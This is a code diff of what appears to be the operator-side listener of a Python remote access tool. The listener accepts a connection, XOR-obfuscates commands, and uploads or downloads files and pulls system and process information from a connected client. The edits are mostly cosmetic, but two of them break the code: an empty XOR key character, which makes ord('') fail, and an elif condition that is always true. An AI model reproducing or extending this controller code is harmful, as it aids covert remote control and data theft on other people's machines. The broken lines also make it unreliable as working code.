@@ -23,13 +23,15 @@ OPTIONS = ["upload", "download", "systeminfo", "processes"]
 def xor(message):
     newMessage = ""
     for char in message:
-        deChar = ord(char) ^ ord('♥')
+        deChar = ord(char) ^ ord('')
         newMessage += str(chr(deChar))
     return str.encode(newMessage)
 
 while True:
     conn, addr = sock.accept()
-    print ('Connection from ' + str(addr))
+    print ('Connected by ' + str(addr))
+  #  rec = conn.recv(15);
+  #  print (xorE(rec));
 
     while True:
         userInput = input(">> ")
@@ -41,7 +43,7 @@ while True:
             conn.close()
             break            
         elif userInput.lower() == "upload":
-            # syntax: upload /path/to/file/to/upload
+            # syntax: upload /path/to/file
             # file will go to client's  current working directory
             print("Uploading...")
             command = userInput.split(' ')
@@ -86,7 +88,7 @@ while True:
 
                 fileuserInput = xor(fileuserInput)
                 print(fileuserInput)
-                # This will probably break at some point, not ideal solution
+                ## This will probably break at some point, not ideal solution
                 if "99999EOF99999" in fileuserInput:
                     temp = fileuserInput.split("99999EOF99999")
                     if "xxxxx" in temp[0]:
@@ -110,7 +112,7 @@ while True:
             print("File download complete!\n")
             f.close()
             break
-        else:
+        elif "systeminfo" or "processes" in userInput.lower():
             userInput = xor(userInput)
             conn.sendall(userInput)
             recv = conn.recv(1024)
